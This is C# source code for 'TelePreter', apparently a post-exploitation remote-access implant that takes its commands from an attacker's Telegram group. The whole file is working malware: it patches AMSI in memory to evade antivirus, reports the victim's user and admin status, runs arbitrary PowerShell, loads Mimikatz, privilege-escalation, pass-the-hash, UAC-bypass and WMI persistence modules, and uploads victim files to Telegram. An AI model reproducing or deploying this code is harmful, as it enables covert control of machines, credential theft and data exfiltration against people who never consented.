using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Security.Principal;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.InputFiles;

namespace TelePreter
{
    public class AmsiPatch
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int DisableAmsi()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                return 1;
            }
            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufferPtr == IntPtr.Zero)
            {
                return 1;
            }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
            {
                return 1;
            }
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
    }

    public class Task
    {
        public string GUID;
        public string output;
        public bool is_completed;
    }

    public class Agent
    {
        private string BotGuid;
        private int GROUP_ID = ; // Change here (GROUP ID Number)
        private string API_TOKEN = ""; // Change here (Bot API TOKEN, talk to Bot Father)
        private TelegramBotClient bot;
        private Runspace runspace;
        private bool Evolved = false;

        public void Load()
        {
            // Reflect Dependencies on Runtime
            System.Reflection.Assembly.Load(Constants.TelegramBotDll);
            System.Reflection.Assembly.Load(Constants.NewtonSoftJsonDll);
        }

        public void LoadModules(Pipeline pipe)
        {
            /* Loads all my favore PowerShell modules so we can work with full-force in compromised host. */
            pipe.Commands.AddScript(Constants.PowerUp);
            pipe.Commands.AddScript(Constants.PowerView);
            pipe.Commands.AddScript(Constants.Powerpreter);
            pipe.Commands.AddScript(Constants.Persistence);
        }

        public string newGuid()
        {
            return Guid.NewGuid().ToString().Split('-')[0];
        }

        public bool IsAdministrator()
        /* This is used to check if our current user is member of Administrator Group */
        {
            bool isAdmin;
            WindowsIdentity user = null;
            try
            {
                user = WindowsIdentity.GetCurrent();
                WindowsPrincipal prince = new WindowsPrincipal(user);
                isAdmin = prince.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            finally
            {
                //Dispose of this object.
                if (user != null)
                {
                    user.Dispose();
                }
            }
            return isAdmin;
        }

        public void Start()
        {
            // Disable AMSI before any powerShell code is run.
            AmsiPatch.DisableAmsi();

            while (1 == 1)
            {
                try
                {
                    //  Generate a GUID for this Instance.
                    this.BotGuid = this.newGuid();
                    this.bot = new TelegramBotClient(this.API_TOKEN);
                    this.bot.OnMessage += OnMessage;
                    this.bot.StartReceiving();
                    this.runspace = RunspaceFactory.CreateRunspace();

                    this.runspace.ApartmentState = System.Threading.ApartmentState.STA;
                    this.runspace.Open();
                    Console.WriteLine("[+] TelePreter has started.");
                    this.bot.SendTextMessageAsync(
                        chatId: this.GROUP_ID,
                        text: "New bot has been registered: " + this.BotGuid
                        + "\n\nWindows: " + this.GetWindowsCaption()
                        + "Identity: " + Environment.UserDomainName + "\\" + Environment.UserName
                    + "\nAdministrator: " + this.IsAdministrator()
                    );
                    Thread.Sleep(int.MaxValue);
                } catch (Exception)
                {
                    this.Start();
                }

            }
        }

        string GetWindowsCaption()
        {
            StringBuilder sb = new StringBuilder();
            Pipeline pipe = this.runspace.CreatePipeline();
            pipe.Commands.AddScript("(Get-WmiObject -class Win32_OperatingSystem).Caption");
            Collection<PSObject> results = pipe.Invoke();
            foreach (PSObject obj in results)
            {
                sb.AppendLine(obj.ToString());
            }
            return sb.ToString();
        }

        string ExecutePS(string Script)
        {
            StringBuilder sb = new StringBuilder();
            Pipeline pipe = this.runspace.CreatePipeline();

            if (this.Evolved)
            {
                this.LoadModules(pipe);
            }

            // Parse for custom PowerShell code here
            if (Script.IndexOf("Get-System", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.GetSystem); }
            if (Script.IndexOf("Invoke-TelepreterStager", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.Stager); }
            if (Script.IndexOf("Invoke-SMBExec", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.PthSMB); }
            if (Script.IndexOf("Invoke-MS16-032", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.MS16_032); }
            if (Script.IndexOf("Invoke-Mimikatz", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.Mimikatz); }
            if (Script.IndexOf("Out-Minidump", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.MiniDump); }
            if (Script.IndexOf("Bypass-UAC", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.BypassUAC_CMSTP); }
            if (Script.IndexOf("Start-System", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.StartSystem); }
            if (Script.IndexOf("Invoke-Portscan", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.Portscan); }
            if (Script.IndexOf("Register-MaliciousWmiEvent", 0, StringComparison.OrdinalIgnoreCase) != -1) { pipe.Commands.AddScript(Constants.WMI); }

            pipe.Commands.AddScript(Script);
            pipe.Commands.Add("Out-String");

            Collection<PSObject> results = pipe.Invoke();
            foreach (PSObject obj in results)
            {
                sb.AppendLine(obj.ToString());
            }
            return sb.ToString();
        }

        private void EvolveScreen()
        {
            this.bot.SendTextMessageAsync(
                        chatId: this.GROUP_ID,
                        text: "What? Bot '" + this.BotGuid + "' is evolving!");
            Thread.Sleep(3);
            this.bot.SendTextMessageAsync(
                        chatId: this.GROUP_ID,
                        text: "Congratulations! Bot '" + this.BotGuid + "' has evolved into Overpowered-Telepreter!\n\nLoaded modules:\nPowerPreter\nPowerUp\nPowerView\nNishang Persistence");
        }

        async void OnMessage(object sender, MessageEventArgs e)
        {


            /* To send orders:
             * 
             * 
             * /bot:GUIDhere /shell Command
             * 
             */

            if (e.Message.Text != null)
            {
                string Order;
                if (e.Message.Text.IndexOf("/bot:" + this.BotGuid) != -1)
                {
                    Order = e.Message.Text.Replace("/bot:" + this.BotGuid, "");
                } else
                {
                    return;
                }

                // Evolve the bot with Extra Modules
                if (Order.IndexOf("/evolve") != -1)
                {
                    if (!this.Evolved)
                    {
                        this.Evolved = true;
                        this.EvolveScreen();
                    }
                }

                // PowerShell Code Execution
                if (Order.IndexOf("/shell") != -1)
                {

                    Task newTask = new Task();
                    newTask.GUID = this.newGuid();
                    string jobCommand = Order.Replace("/shell", "");

                    // Send message notifying that a new execution task has started.
                    await this.bot.SendTextMessageAsync(
                        chatId: e.Message.Chat,
                        text: "Registered new task:\n\nGUID: " + newTask.GUID.ToString() + "\nCommand: " + jobCommand
                    );

                    try
                    {
                        newTask.output = ExecutePS(jobCommand);
                    } catch (Exception)
                    {
                        newTask.output = "PowerShell Execution Error";
                    }

                    if ((newTask.output.Length == 0 || newTask.output == "\n"))
                    {
                        await this.bot.SendTextMessageAsync(
                            chatId: e.Message.Chat,
                            text: "Output from task " + newTask.GUID.ToString() + ": \n\nNo Output."
                        );
                    } else
                    {
                        StringBuilder sb = new StringBuilder();
                        string[] lines = newTask.output.Split('\n');
                        int n = 0;
                        foreach (string line in lines)
                        {
                            Thread.Sleep(1);
                            n++;
                            sb.Append(line);
                            if (n % 20 == 0)
                            {
                                await this.bot.SendTextMessageAsync(
                                chatId: e.Message.Chat,
                                text: "Output from task " + newTask.GUID.ToString() + ": \n\n" + sb.ToString()
                                );
                                sb = new StringBuilder();
                            }
                        }

                        string LastPiece = sb.ToString();
                        if (LastPiece.Length > 0)
                        {
                            Thread.Sleep(1);
                            await this.bot.SendTextMessageAsync(
                                chatId: e.Message.Chat,
                                text: "Output from task " + newTask.GUID.ToString() + ": \n\n" + LastPiece
                                );
                        }
                        return; 
                    }
                }

                if (Order.IndexOf("/exit") != -1)
                {
                    await this.bot.SendTextMessageAsync(
                            chatId: e.Message.Chat,
                            text: "TelePreter agent is going to be shutdown ..."
                        );
                    Environment.Exit(0);
                }

                if (Order.IndexOf("/download") != -1)
                {
                    Task newTask = new Task();
                    newTask.GUID = this.newGuid();

                    // Send message notifying that a new Upload task has started.
                    await this.bot.SendTextMessageAsync(
                        chatId: e.Message.Chat,
                        text: "Registered new task: " + newTask.GUID.ToString()
                    );

                    string FileToUpload = Order.Replace("/download", "");
                    if (File.Exists(FileToUpload))
                    {
                        using (FileStream fs = File.OpenRead(FileToUpload))
                        {
                            InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, Path.GetFileName(FileToUpload));
                            await this.bot.SendDocumentAsync(e.Message.Chat, inputOnlineFile);
                        }
                    } else
                    {
                        await this.bot.SendTextMessageAsync(
                            chatId: e.Message.Chat,
                            text: "Error: Could not find this file from task " + newTask.GUID.ToString()
                        );
                    }
                }
            }
        }
    }
}
